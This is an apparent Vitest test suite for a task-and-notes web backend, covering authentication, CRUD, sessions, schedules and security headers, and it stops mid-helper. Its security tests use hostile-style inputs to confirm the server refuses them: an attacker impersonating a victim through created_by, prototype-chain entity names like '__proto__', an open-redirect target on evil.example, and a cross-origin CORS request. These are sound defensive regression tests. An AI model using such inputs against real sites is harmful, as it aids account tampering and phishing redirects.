/* @vitest-environment node */
import { existsSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { validateHeaderValue } from "node:http";
import { Readable } from "node:stream";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { createHash, randomBytes } from "node:crypto";
import { mkdirSync, readFileSync, utimesSync, writeFileSync } from "node:fs";
import { closeDatabase, createDatabase } from "./db.js";
import { readZip } from "./test-support/readZip.js";
import { createRequestHandler } from "./server.js";
import { resetRateLimits } from "./ai/rate-limit.js";
import { allTools } from "./ai/tools.js";
import { changeEnd, newSchedule } from "./lib/schedule.js";
import { createRequestHandler as makeHandler } from "./server.js";
import { getRequestIpAddress } from "./auth.js";
import { inlineScriptHashes, policyFor } from "./security-headers.js";
import { deviceLabel } from "./sessions.js";
import { createHash as hashOf } from "node:crypto";

let tempDir = "";
let db;
let handler;
/** @type {any} */
let config;

function createMockRequest({ method = "GET", url = "/", headers = {}, body }) {
  const payload =
    body == null ? [] : [Buffer.isBuffer(body) ? body : Buffer.from(typeof body === "string" ? body : JSON.stringify(body))];
  const request = /** @type {any} */ (Readable.from(payload));
  request.method = method;
  request.url = url;
  request.headers = Object.fromEntries(
    Object.entries(headers).map(([key, value]) => [key.toLowerCase(), value])
  );
  request.socket = { remoteAddress: "127.0.0.1" };
  return request;
}

function createMockResponse() {
  /** @type {Record<string, string | string[]>} */
  const headers = {};

  let statusCode = 200;
  let body = "";
  let ended = false;
  /** @type {Buffer[]} */
  const chunks = [];

  let resolveDone;
  const done = new Promise((resolve) => {
    resolveDone = resolve;
  });

  return {
    setHeader(name, value) {
      headers[name] = value;
    },
    writeHead(code, head = {}) {
      statusCode = code;
      Object.assign(headers, head);
    },
    // Streaming responses (the export ZIP) write chunks before end().
    write(chunk) {
      chunks.push(Buffer.from(chunk));
      return true;
    },
    on() {},
    once() {},
    // Attachment bytes arrive via stream.pipe(), which announces itself.
    emit() {
      return false;
    },
    destroyed: false,
    get writableEnded() {
      return ended;
    },
    destroy(error) {
      ended = true;
      this.destroyed = true;
      resolveDone(error);
    },
    end(chunk = "") {
      if (ended) return;
      ended = true;
      if (chunk && chunk.length) chunks.push(Buffer.from(chunk));
      body += typeof chunk === "string" ? chunk : Buffer.from(chunk).toString("utf8");
      resolveDone();
    },
    async asBuffer() {
      await done;
      return { statusCode, headers, body: Buffer.concat(chunks) };
    },
    async asJson() {
      await done;
      return {
        statusCode,
        headers,
        body: body ? JSON.parse(body) : null,
      };
    },
  };
}

async function invokeRaw(path, init = {}) {
  const request = createMockRequest({ method: init.method || "GET", url: path, headers: init.headers || {}, body: undefined });
  const response = createMockResponse();
  await handler(request, response);
  return response.asBuffer();
}

async function invoke(path, init = {}) {
  const request = createMockRequest({
    method: init.method || "GET",
    url: path,
    headers: init.headers || {},
    body: init.body,
  });
  const response = createMockResponse();
  await handler(request, response);
  return response.asJson();
}

async function login(email) {
  const result = await invoke("/api/apps/test-app/auth/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: {
      email,
      password: "whatever",
    },
  });

  expect(result.statusCode).toBe(200);
  expect(result.body.access_token).toBeTruthy();
  return result.body.access_token;
}

beforeAll(() => {
  tempDir = mkdtempSync(join(tmpdir(), "taskflow-backend-"));
  config = {
    host: "127.0.0.1",
    port: 0,
    appId: "test-app",
    appName: "Taskflow Test",
    publicAppUrl: "http://127.0.0.1:4173",
    dbFile: join(tempDir, "taskflow.sqlite"),
    // Empty until "the built app" below puts a page in it; never the real dist/.
    distRoot: join(tempDir, "dist"),
    sessionCookieName: "taskflow_test_session",
    sessionTtlDays: 30,
    deletedTaskRetentionDays: 7,
    allowAnyPassword: true,
    googleClientId: "",
    googleClientSecret: "",
    hasGoogleCredentials: false,
    googleMode: "disabled",
    googleCalendarClientId: "",
    googleCalendarClientSecret: "",
    hasGoogleCalendarCredentials: false,
    integrationsEnabled: false,
    syncIntervalMs: 300000,
    notificationPollMs: 60000,
    vapidPublicKey: "",
    vapidPrivateKey: "",
    vapidSubject: "mailto:test@example.com",
  };

  db = createDatabase(config);
  handler = createRequestHandler(config, db);
});

// Sign-ins are rate limited per address, and every test signs in from the
// same one.
beforeEach(() => resetRateLimits());

afterAll(() => {
  closeDatabase();
  rmSync(tempDir, { recursive: true, force: true });
});

describe("taskflow backend contract", () => {
  it("serves public settings", async () => {
    const result = await invoke("/api/apps/public/prod/public-settings/by-id/test-app");
    expect(result.statusCode).toBe(200);
    expect(result.body.app_id).toBe("test-app");
    expect(result.body.name).toBe("Taskflow Test");
    // The Terms and Privacy pages show it; none is configured here.
    expect(result.body.support_email).toBe("");
  });

  it("supports login, me, logout, and seeded priorities", async () => {
    const accessToken = await login("isaac@example.com");

    const meResult = await invoke("/api/apps/test-app/entities/User/me", {
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });

    expect(meResult.statusCode).toBe(200);
    expect(meResult.body.email).toBe("isaac@example.com");
    expect(meResult.body.role).toBe("admin");

    const prioritiesResult = await invoke("/api/apps/test-app/entities/Priority?sort=order", {
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });

    expect(prioritiesResult.statusCode).toBe(200);
    expect(prioritiesResult.body).toHaveLength(4);
    expect(prioritiesResult.body.map((p) => p.name)).toEqual([
      "Urgent",
      "High",
      "Normal",
      "Low",
    ]);

    const logoutResult = await invoke("/api/apps/auth/logout", {
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });

    expect(logoutResult.statusCode).toBe(200);

    const postLogoutMe = await invoke("/api/apps/test-app/entities/User/me", {
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });

    expect(postLogoutMe.statusCode).toBe(401);
  });

  it("supports notification settings and subscription endpoints", async () => {
    const accessToken = await login("notify@example.com");
    const headers = {
      Authorization: `Bearer ${accessToken}`,
      "Content-Type": "application/json",
    };

    const defaults = await invoke("/api/apps/test-app/notifications/settings", { headers });
    expect(defaults.statusCode).toBe(200);
    expect(defaults.body.available).toBe(false);
    expect(defaults.body.settings).toMatchObject({
      enabled: false,
      timedOffsetMinutes: 0,
      allDayTime: "9:00AM",
    });

    const saved = await invoke("/api/apps/test-app/notifications/settings", {
      method: "PUT",
      headers,
      body: {
        settings: {
          enabled: true,
          timeZone: "America/New_York",
          timedOffsetMinutes: -15,
          allDayTime: "8:30AM",
          includeExternalEvents: true,
        },
      },
    });
    expect(saved.statusCode).toBe(200);
    expect(saved.body.settings).toMatchObject({
      enabled: true,
      timeZone: "America/New_York",
      timedOffsetMinutes: -15,
      allDayTime: "8:30AM",
      includeExternalEvents: true,
    });

    const subscribed = await invoke("/api/apps/test-app/notifications/subscribe", {
      method: "POST",
      headers,
      body: {
        subscription: {
          endpoint: "https://push.example.com/notify-endpoint",
          keys: { p256dh: "p256dh", auth: "auth" },
        },
      },
    });
    expect(subscribed.statusCode).toBe(200);
    expect(subscribed.body.success).toBe(true);

    const unsubscribed = await invoke("/api/apps/test-app/notifications/unsubscribe", {
      method: "POST",
      headers,
      body: { endpoint: "https://push.example.com/notify-endpoint" },
    });
    expect(unsubscribed.statusCode).toBe(200);
    expect(unsubscribed.body.success).toBe(true);

    const test = await invoke("/api/apps/test-app/notifications/test", {
      method: "POST",
      headers,
    });
    expect(test.statusCode).toBe(503);
    expect(test.body.code).toBe("notifications_unavailable");
  });

  it("supports scoped CRUD for tasks and deleted-task retention", async () => {
    const isaacToken = await login("isaac@example.com");

    const createdTask = await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${isaacToken}`,
        "Content-Type": "application/json",
      },
      body: {
        title: "Write backend",
        task_type: "recurring",
        recurrence: "weekly",
        recurrence_days: [1, 3],
        tags: ["backend", "important"],
        due_date: "2026-04-01",
      },
    });

    expect(createdTask.statusCode).toBe(201);
    expect(createdTask.body.title).toBe("Write backend");
    expect(createdTask.body.tags).toEqual(["backend", "important"]);
    expect(createdTask.body.recurrence_days).toEqual([1, 3]);

    const updatedTask = await invoke(`/api/apps/test-app/entities/Task/${createdTask.body.id}`, {
      method: "PUT",
      headers: {
        Authorization: `Bearer ${isaacToken}`,
        "Content-Type": "application/json",
      },
      body: {
        status: "done",
        completed_at: "2026-04-01T10:00:00.000Z",
      },
    });

    expect(updatedTask.statusCode).toBe(200);
    expect(updatedTask.body.status).toBe("done");

    const deletedRecord = await invoke("/api/apps/test-app/entities/DeletedTask", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${isaacToken}`,
        "Content-Type": "application/json",
      },
      body: {
        task_id: createdTask.body.id,
        title: createdTask.body.title,
        task_type: "recurring",
        recurrence: "weekly",
        recurrence_days: [1, 3],
        tags: ["backend", "important"],
        deleted_at: "2026-04-01T10:30:00.000Z",
        subtasks: [],
      },
    });

    expect(deletedRecord.statusCode).toBe(201);
    expect(deletedRecord.body.expires_at).toBeTruthy();

    const isaacTasks = await invoke("/api/apps/test-app/entities/Task?sort=-created_date", {
      headers: {
        Authorization: `Bearer ${isaacToken}`,
      },
    });

    expect(isaacTasks.statusCode).toBe(200);
    expect(isaacTasks.body).toHaveLength(1);

    const otherUserToken = await login("other@example.com");
    const otherUserTasks = await invoke("/api/apps/test-app/entities/Task", {
      headers: {
        Authorization: `Bearer ${otherUserToken}`,
      },
    });

    expect(otherUserTasks.statusCode).toBe(200);
    expect(otherUserTasks.body).toHaveLength(0);

    const deleteTaskResult = await invoke(`/api/apps/test-app/entities/Task/${createdTask.body.id}`, {
      method: "DELETE",
      headers: {
        Authorization: `Bearer ${isaacToken}`,
      },
    });

    expect(deleteTaskResult.statusCode).toBe(200);
    expect(deleteTaskResult.body.success).toBe(true);
  });
});

describe("registry entities: Note", () => {
  it("supports full Note CRUD with per-user isolation", async () => {
    const isaacToken = await login("isaac@example.com");
    const auth = { Authorization: `Bearer ${isaacToken}` };

    // Untitled notes are allowed (client renders "Untitled").
    const created = await invoke("/api/apps/test-app/entities/Note", {
      method: "POST",
      headers: { ...auth, "Content-Type": "application/json" },
      body: { title: "", content_json: "", content_text: "", pinned: false },
    });
    expect(created.statusCode).toBe(201);
    expect(created.body.id).toMatch(/^note_/);
    expect(created.body.pinned).toBe(false);

    const updated = await invoke(`/api/apps/test-app/entities/Note/${created.body.id}`, {
      method: "PUT",
      headers: { ...auth, "Content-Type": "application/json" },
      body: { title: "Meeting notes", content_text: "agenda", pinned: true, tags: ["work", "q3"], priority_id: "priority_1" },
    });
    expect(updated.statusCode).toBe(200);
    expect(updated.body.title).toBe("Meeting notes");
    expect(updated.body.pinned).toBe(true);
    // Notes share tags + priority with tasks (JSON tags round-trip).
    expect(updated.body.tags).toEqual(["work", "q3"]);
    expect(updated.body.priority_id).toBe("priority_1");

    const listed = await invoke("/api/apps/test-app/entities/Note?sort=-updated_date", {
      headers: auth,
    });
    expect(listed.statusCode).toBe(200);
    expect(listed.body.some((n) => n.id === created.body.id)).toBe(true);

    // Another user must not see Isaac's notes.
    const otherToken = await login("someone-else@example.com");
    const otherList = await invoke("/api/apps/test-app/entities/Note", {
      headers: { Authorization: `Bearer ${otherToken}` },
    });
    expect(otherList.statusCode).toBe(200);
    expect(otherList.body.some((n) => n.id === created.body.id)).toBe(false);

    const deleted = await invoke(`/api/apps/test-app/entities/Note/${created.body.id}`, {
      method: "DELETE",
      headers: auth,
    });
    expect(deleted.statusCode).toBe(200);
  });
});

describe("account safety", () => {
  it("limits sign-in attempts from one address", async () => {
    const attempt = () => invoke("/api/apps/test-app/auth/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: { email: "limit@example.com", password: "x" } });
    for (let i = 0; i < 20; i += 1) expect((await attempt()).statusCode).toBe(200);
    const refused = await attempt();
    expect(refused.statusCode).toBe(429);
    expect(refused.body.code).toBe("too_many_attempts");
  });

  it("takes the visitor's address from Cloudflare, never from X-Forwarded-For", () => {
    const request = (headers) => ({ headers, socket: { remoteAddress: "10.0.0.5" } });
    expect(getRequestIpAddress(request({ "cf-connecting-ip": "203.0.113.9", "x-forwarded-for": "1.2.3.4" }))).toBe("203.0.113.9");
    expect(getRequestIpAddress(request({ "x-forwarded-for": "1.2.3.4" }))).toBe("10.0.0.5");
  });

  it("ignores the any-password switch anywhere but this machine", async () => {
    const saved = handler;
    handler = makeHandler({ ...config, publicAppUrl: "https://zephyrly.app" }, db);
    try {
      const attempt = await invoke("/api/apps/test-app/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: { email: "stranger@example.com", password: "anything" },
      });
      expect(attempt.statusCode).toBe(401);
      const settings = await invoke("/api/apps/public/prod/public-settings/by-id/test-app");
      expect(settings.body.auth_providers.email_password).toBe(false);
      expect(db.prepare("SELECT COUNT(*) AS n FROM users WHERE email = ?").get("stranger@example.com").n).toBe(0);
    } finally {
      handler = saved;
    }
  });

  it("Google sign-in needs an email Google has confirmed, and never moves an account to another Google account", async () => {
    const saved = handler;
    handler = makeHandler({ ...config, googleMode: "oauth", googleClientId: "id", googleClientSecret: "secret", hasGoogleCredentials: true }, db);
    let profile = {};
    const fetchSpy = /** @type {any} */ (vi.spyOn(globalThis, "fetch")).mockImplementation(async (/** @type {any} */ url) =>
      String(url).includes("oauth2.googleapis.com/token")
        ? new Response(JSON.stringify({ access_token: "google-access" }), { status: 200 })
        : new Response(JSON.stringify(profile), { status: 200 })
    );
    const signIn = async (info) => {
      profile = info;
      const start = await invoke("/api/apps/auth/login?app_id=test-app", { headers: { Accept: "application/json" } });
      const state = new URL(start.body.redirect_url).searchParams.get("state");
      return invoke(`/api/apps/auth/google/callback?state=${state}&code=abc`);
    };
    try {
      const unverified = await signIn({ sub: "g-1", email: "gina@example.com", email_verified: false, name: "Gina" });
      expect(unverified.statusCode).toBe(302);
      expect(new URL(String(unverified.headers.Location)).searchParams.get("auth_error")).toBe("google_email_unverified");
      expect(unverified.headers["Set-Cookie"]).toBeUndefined();
      expect(db.prepare("SELECT COUNT(*) AS n FROM users WHERE email = ?").get("gina@example.com").n).toBe(0);

      const ok = await signIn({ sub: "g-1", email: "gina@example.com", email_verified: true, name: "Gina" });
      expect(ok.statusCode).toBe(302);
      expect(String(ok.headers["Set-Cookie"])).toContain("taskflow_test_session=");

      // Someone else's Google account claiming the same email: refused.
      const other = await signIn({ sub: "g-2", email: "gina@example.com", email_verified: true, name: "Not Gina" });
      expect(new URL(String(other.headers.Location)).searchParams.get("auth_error")).toBe("google_account_mismatch");
      expect(other.headers["Set-Cookie"]).toBeUndefined();
      expect(db.prepare("SELECT google_subject FROM users WHERE email = ?").get("gina@example.com").google_subject).toBe("g-1");

      // Google's own error text never reaches the browser.
      fetchSpy.mockImplementationOnce(async () => new Response("secret internal detail", { status: 400 }));
      const failed = await signIn({});
      expect(new URL(String(failed.headers.Location)).searchParams.get("auth_error")).toBe("google_sign_in_failed");
      expect(failed.headers.Location).not.toContain("secret");
    } finally {
      fetchSpy.mockRestore();
      handler = saved;
    }
  });

  it("sends browser protections with every response, and a script policy for the page", async () => {
    const health = await invoke("/api/health");
    expect(health.headers).toMatchObject({
      "X-Content-Type-Options": "nosniff",
      "Referrer-Policy": "strict-origin-when-cross-origin",
      "Cross-Origin-Opener-Policy": "same-origin",
    });
    // HSTS only over HTTPS.
    expect(health.headers["Strict-Transport-Security"]).toBeUndefined();
    const saved = handler;
    handler = makeHandler({ ...config, publicAppUrl: "https://zephyrly.app" }, db);
    try {
      expect((await invoke("/api/health")).headers["Strict-Transport-Security"]).toBe("max-age=31536000");
    } finally {
      handler = saved;
    }

    // The page's one inline script (dark mode before load) is allowed by its exact hash, and no other inline script is.
    const html = readFileSync(new URL("../index.html", import.meta.url), "utf8");
    const inline = /<script>([\s\S]*?)<\/script>/.exec(html)[1];
    const policy = policyFor(html);
    expect(policy).toContain(`script-src 'self' 'sha256-${hashOf("sha256").update(inline).digest("base64")}'`);
    expect(policy).not.toMatch(/script-src[^;]*unsafe-inline/);
    expect(policy).toContain("frame-ancestors 'none'");
    expect(policy).toContain("object-src 'none'");
    expect(inlineScriptHashes('<script src="/a.js"></script><script>x()</script>')).toHaveLength(1);
  });
});

describe("signed-in devices", () => {
  it("lists where the account is signed in, and signs out one or everywhere else", async () => {
    const signIn = async (userAgent) => {
      const result = await invoke("/api/apps/test-app/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": userAgent },
        body: { email: "devices@example.com", password: "x" },
      });
      return { Authorization: `Bearer ${result.body.access_token}` };
    };
    const phone = await signIn("Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1");
    const laptop = await signIn("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/140.0 Safari/537.36");
    const tablet = await signIn("Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Safari/604.1");

    const listed = await invoke("/api/apps/test-app/sessions", { headers: laptop });
    expect(listed.statusCode).toBe(200);
    expect(listed.body.sessions.map((s) => [s.device, s.current]).sort()).toEqual([
      ["Chrome on Mac", true],
      ["Safari on iPad", false],
      ["Safari on iPhone", false],
    ]);

    // Signing out the iPad: its token stops working at once.
    const ipad = listed.body.sessions.find((s) => s.device === "Safari on iPad");
    expect((await invoke(`/api/apps/test-app/sessions/${ipad.id}`, { method: "DELETE", headers: laptop })).statusCode).toBe(200);
    expect((await invoke("/api/apps/test-app/entities/User/me", { headers: tablet })).statusCode).toBe(401);

    // This device isn't signed out from here, and nobody else's can be touched.
    const mine = listed.body.sessions.find((s) => s.current);
    expect((await invoke(`/api/apps/test-app/sessions/${mine.id}`, { method: "DELETE", headers: laptop })).statusCode).toBe(400);
    const stranger = { Authorization: `Bearer ${await login("stranger-devices@example.com")}` };
    expect((await invoke(`/api/apps/test-app/sessions/${mine.id}`, { method: "DELETE", headers: stranger })).statusCode).toBe(404);
    expect((await invoke("/api/apps/test-app/sessions", { headers: stranger })).body.sessions).toHaveLength(1);

    // Everywhere else: the phone is out, the laptop stays in.
    const others = await invoke("/api/apps/test-app/sessions/sign-out-others", { method: "POST", headers: laptop });
    expect(others.body.signed_out).toBe(1);
    expect((await invoke("/api/apps/test-app/entities/User/me", { headers: phone })).statusCode).toBe(401);
    expect((await invoke("/api/apps/test-app/entities/User/me", { headers: laptop })).statusCode).toBe(200);
    expect((await invoke("/api/apps/test-app/sessions", {})).statusCode).toBe(401);
  });

  it("names devices from their browser", () => {
    expect(deviceLabel("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36 Edg/140.0")).toBe("Edge on Windows");
    expect(deviceLabel("Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 Chrome/140.0 Mobile Safari/537.36")).toBe("Chrome on Android");
    expect(deviceLabel("Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0")).toBe("Firefox on Linux");
    expect(deviceLabel("")).toBe("Unknown device");
  });
});

describe("a note's schedule", () => {
  it("round-trips, and a broken one is refused rather than stored", async () => {
    const token = await login("schedule@example.com");
    const headers = { Authorization: `Bearer ${token}`, "Content-Type": "application/json" };
    const created = await invoke("/api/apps/test-app/entities/Note", { method: "POST", headers, body: { title: "Saturday" } });
    expect(created.body.schedule_json).toBe("");

    const schedule = changeEnd(newSchedule(), 7, 450).schedule;
    const saved = await invoke(`/api/apps/test-app/entities/Note/${created.body.id}`, {
      method: "PUT",
      headers,
      body: { schedule_json: JSON.stringify(schedule) },
    });
    expect(saved.statusCode).toBe(200);
    expect(JSON.parse(saved.body.schedule_json)).toEqual(schedule);

    const overlapping = { ...schedule, slots: schedule.slots.map((slot, i) => (i === 3 ? { ...slot, start: slot.start - 5 } : slot)) };
    for (const [body, message] of [
      [{ schedule_json: JSON.stringify(overlapping) }, "schedule_json has slots that overlap or leave gaps."],
      [{ schedule_json: "{not json" }, "schedule_json isn't a schedule."],
      [{ schedule_json: JSON.stringify({ ...schedule, gap: -5 }) }, "schedule_json has a gap that isn't 0–240 minutes."],
    ]) {
      const refused = await invoke(`/api/apps/test-app/entities/Note/${created.body.id}`, { method: "PUT", headers, body });
      expect(refused.statusCode).toBe(400);
      expect(refused.body.message).toBe(message);
    }
    const stored = await invoke(`/api/apps/test-app/entities/Note/${created.body.id}`, { headers });
    expect(JSON.parse(stored.body.schedule_json)).toEqual(schedule);

    // Recently Deleted keeps it too.
    const trashed = await invoke("/api/apps/test-app/entities/DeletedNote", {
      method: "POST",
      headers,
      body: { note_id: created.body.id, title: "Saturday", schedule_json: JSON.stringify(schedule) },
    });
    expect(trashed.statusCode).toBe(201);
    expect(JSON.parse(trashed.body.schedule_json)).toEqual(schedule);
  });
});

describe("pinned schedule settings", () => {
  it("are kept per person, only what makes sense, and exported", async () => {
    const token = await login("pins@example.com");
    const headers = { Authorization: `Bearer ${token}`, "Content-Type": "application/json" };
    const none = await invoke("/api/apps/test-app/schedule-defaults", { headers });
    expect(none.body).toEqual({ defaults: {}, similar_tasks: "ask" });

    const saved = await invoke("/api/apps/test-app/schedule-defaults", {
      method: "PUT",
      headers,
      body: { defaults: { dayStart: 420, gap: 5, cascade: "sideways", slot: 3, now: false, html: "<b>" } },
    });
    expect(saved.statusCode).toBe(200);
    expect(saved.body).toEqual({ defaults: { dayStart: 420, gap: 5, now: false }, similar_tasks: "ask" });

    // What to do with a slot like a task already on the day: changed on its
    // own, without touching the pins; anything unknown is "ask".
    const merge = await invoke("/api/apps/test-app/schedule-defaults", { method: "PUT", headers, body: { similar_tasks: "merge" } });
    expect(merge.body).toEqual({ defaults: { dayStart: 420, gap: 5, now: false }, similar_tasks: "merge" });
    const junk = await invoke("/api/apps/test-app/schedule-defaults", { method: "PUT", headers, body: { similar_tasks: "explode" } });
    expect(junk.body.similar_tasks).toBe("ask");
    expect((await invoke("/api/apps/test-app/schedule-defaults", { headers })).body.defaults).toEqual({ dayStart: 420, gap: 5, now: false });

    // Someone else's are their own.
    const other = await login("pins-other@example.com");
    expect((await invoke("/api/apps/test-app/schedule-defaults", { headers: { Authorization: `Bearer ${other}` } })).body.defaults).toEqual({});
    // Signed out: no.
    expect((await invoke("/api/apps/test-app/schedule-defaults", {})).statusCode).toBe(401);

    const zip = await invokeRaw("/api/apps/test-app/export", { headers: { Authorization: `Bearer ${token}` } });
    const files = readZip(zip.body);
    const data = JSON.parse(files.get([...files.keys()].find((n) => n.endsWith("/data.json"))).toString("utf8"));
    expect(data.schedule_defaults).toEqual({ dayStart: 420, gap: 5, now: false });
  });
});

describe("registry entities: DeletedNote", () => {
  it("supports CRUD, defaults expiry from retention, and purges expired records lazily", async () => {
    const token = await login("isaac@example.com");
    const auth = { Authorization: `Bearer ${token}` };

    // Create with defaults — deleted_at/expires_at are stamped server-side.
    const created = await invoke("/api/apps/test-app/entities/DeletedNote", {
      method: "POST",
      headers: { ...auth, "Content-Type": "application/json" },
      body: { note_id: "note_x", title: "Trash me", content_text: "body", tags: ["work"], pinned: true },
    });
    expect(created.statusCode).toBe(201);
    expect(created.body.id).toMatch(/^delnote_/);
    expect(created.body.deleted_at).toBeTruthy();
    // retention default is 7 days — expires after deleted_at
    expect(new Date(created.body.expires_at) > new Date(created.body.deleted_at)).toBe(true);
    expect(created.body.tags).toEqual(["work"]);
    expect(created.body.pinned).toBe(true);

    // An already-expired record gets swept on the next list (lazy purge).
    const expired = await invoke("/api/apps/test-app/entities/DeletedNote", {
      method: "POST",
      headers: { ...auth, "Content-Type": "application/json" },
      body: {
        note_id: "note_y",
        title: "Long gone",
        deleted_at: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString(),
        expires_at: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toISOString(),
      },
    });
    expect(expired.statusCode).toBe(201);

    const listed = await invoke("/api/apps/test-app/entities/DeletedNote", { headers: auth });
    expect(listed.statusCode).toBe(200);
    expect(listed.body.some((r) => r.id === created.body.id)).toBe(true);
    expect(listed.body.some((r) => r.id === expired.body.id)).toBe(false); // purged

    const removed = await invoke(`/api/apps/test-app/entities/DeletedNote/${created.body.id}`, {
      method: "DELETE",
      headers: auth,
    });
    expect(removed.statusCode).toBe(200);
  });
});

describe("server safety", () => {
  const json = (token) => ({ Authorization: `Bearer ${token}`, "Content-Type": "application/json" });

  it("never lets a client create a record inside someone else's account", async () => {
    const victim = await login("victim@example.com");
    const attacker = await login("attacker@example.com");

    const planted = await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: json(attacker),
      body: {
        title: "Planted",
        due_date: "2026-09-25",
        // Naming the victim used to be enough to land in their account.
        created_by: "victim@example.com",
        created_by_id: "anything",
      },
    });
    expect(planted.statusCode).toBe(201);
    expect(planted.body.created_by).toBe("attacker@example.com");

    const victimTasks = await invoke("/api/apps/test-app/entities/Task", { headers: json(victim) });
    expect(victimTasks.body.some((t) => t.title === "Planted")).toBe(false);
  });

  it("404s entity names that only exist on Object.prototype", async () => {
    const token = await login("proto@example.com");
    for (const name of ["constructor", "toString", "__proto__", "hasOwnProperty"]) {
      const result = await invoke(`/api/apps/test-app/entities/${name}`, { headers: json(token) });
      expect(result.statusCode).toBe(404);
      expect(result.body.code).toBe("unknown_entity");
    }
  });

  it("rejects wrong shapes with a 400 instead of a driver error", async () => {
    const token = await login("shapes@example.com");
    const post = (body) =>
      invoke("/api/apps/test-app/entities/Task", { method: "POST", headers: json(token), body });

    expect((await post({ title: "ok", description: { nested: true } })).statusCode).toBe(400);
    expect((await post({ title: "ok", tags: { not: "a list" } })).statusCode).toBe(400);
    expect((await post({ title: "ok", tags: [{ tag: 1 }] })).statusCode).toBe(400);
    expect((await post(["an", "array"])).statusCode).toBe(400);
  });

  it("caps field sizes well above anything the app writes", async () => {
    const token = await login("sizes@example.com");
    const post = (body) =>
      invoke("/api/apps/test-app/entities/Task", { method: "POST", headers: json(token), body });

    // A realistic long description — far past the editor's 500 words — is fine.
    const long = await post({ title: "Long", description: "word ".repeat(20_000) });
    expect(long.statusCode).toBe(201);

    const tooLong = await post({ title: "x".repeat(2_001) });
    expect(tooLong.statusCode).toBe(400);
    expect(tooLong.body.code).toBe("field_too_long");

    const tooManyTags = await post({ title: "Tags", tags: Array.from({ length: 101 }, (_, i) => `t${i}`) });
    expect(tooManyTags.statusCode).toBe(400);

    // Updates are held to the same rules.
    const update = await invoke(`/api/apps/test-app/entities/Task/${long.body.id}`, {
      method: "PUT",
      headers: json(token),
      body: { title: "y".repeat(5_000) },
    });
    expect(update.statusCode).toBe(400);
  });

  it("refuses oversized bodies — including on login, before anyone is signed in", async () => {
    const hugeLogin = await invoke("/api/apps/test-app/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: { email: "a@example.com", password: "p".repeat(100 * 1024) },
    });
    expect(hugeLogin.statusCode).toBe(413);
    expect(hugeLogin.headers.Connection).toBe("close");

    const token = await login("body@example.com");
    const hugeTask = await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: json(token),
      body: { title: "Huge", description_json: "x".repeat(5 * 1024 * 1024) },
    });
    expect(hugeTask.statusCode).toBe(413);
  });

  it("keeps sign-in and sign-out redirects on this app's own origin", async () => {
    const offsite = await invoke(
      `/api/apps/auth/logout?from_url=${encodeURIComponent("https://evil.example/fake-login")}`
    );
    expect(offsite.statusCode).toBe(302);
    expect(offsite.headers.Location).toBe("http://127.0.0.1:4173/login");

    const onsite = await invoke(`/api/apps/auth/logout?from_url=${encodeURIComponent("/login?bye=1")}`);
    expect(onsite.headers.Location).toBe("http://127.0.0.1:4173/login?bye=1");

    // Google isn't configured here, so sign-in bounces to /login carrying
    // only a same-origin path — never the off-site address.
    const signIn = await invoke(
      `/api/apps/auth/login?app_id=test-app&from_url=${encodeURIComponent("https://evil.example/")}`
    );
    expect(signIn.statusCode).toBe(302);
    expect(String(signIn.headers.Location).startsWith("http://127.0.0.1:4173/login")).toBe(true);
    expect(signIn.headers.Location).not.toContain("evil.example");
  });
});

describe("CORS", () => {
  it("allows credentialed calls from the app's own origin only", async () => {
    const own = await invoke("/api/health", { headers: { Origin: "http://127.0.0.1:4173" } });
    expect(own.headers["Access-Control-Allow-Origin"]).toBe("http://127.0.0.1:4173");
    expect(own.headers["Access-Control-Allow-Credentials"]).toBe("true");

    // Any other site used to be echoed straight back with credentials allowed.
    const other = await invoke("/api/health", { headers: { Origin: "https://evil.example" } });
    expect(other.headers["Access-Control-Allow-Origin"]).toBeUndefined();
    expect(other.headers["Access-Control-Allow-Credentials"]).toBeUndefined();
    expect(other.headers.Vary).toBe("Origin");
  });
});

describe("the built app, and the requests that never get it", () => {
  const PAGE = '<!doctype html><html><head><title>Zephyrly</title></head><body><div id="root"></div></body></html>\n';
  const SCRIPT = 'console.log("the app");\n';
  const HTML = "text/html; charset=utf-8";
  const JSON_TYPE = "application/json; charset=utf-8";

  // A stand-in for `npm run build`: the page, one asset, and a dotfile that
  // has no business being there. CI runs these tests before it builds, so the
  // real dist/ can't be counted on.
  beforeAll(() => {
    mkdirSync(join(config.distRoot, "assets"), { recursive: true });
    writeFileSync(join(config.distRoot, "index.html"), PAGE);
    writeFileSync(join(config.distRoot, "assets", "app-4f3a9c.js"), SCRIPT);
    writeFileSync(join(config.distRoot, ".DS_Store"), "left behind by Finder");
  });

  const get = async (path) => {
    const { statusCode, headers, body } = await invokeRaw(path);
    return { status: statusCode, type: headers["Content-Type"], cache: headers["Cache-Control"], text: body.toString("utf8") };
  };
  const expectThePage = async (path) => {
    expect(await get(path), path).toEqual({ status: 200, type: HTML, cache: "no-store", text: PAGE });
  };
  /** The server's ordinary JSON 404, and none of the page. */
  const expectNotFound = async (path) => {
    const result = await get(path);
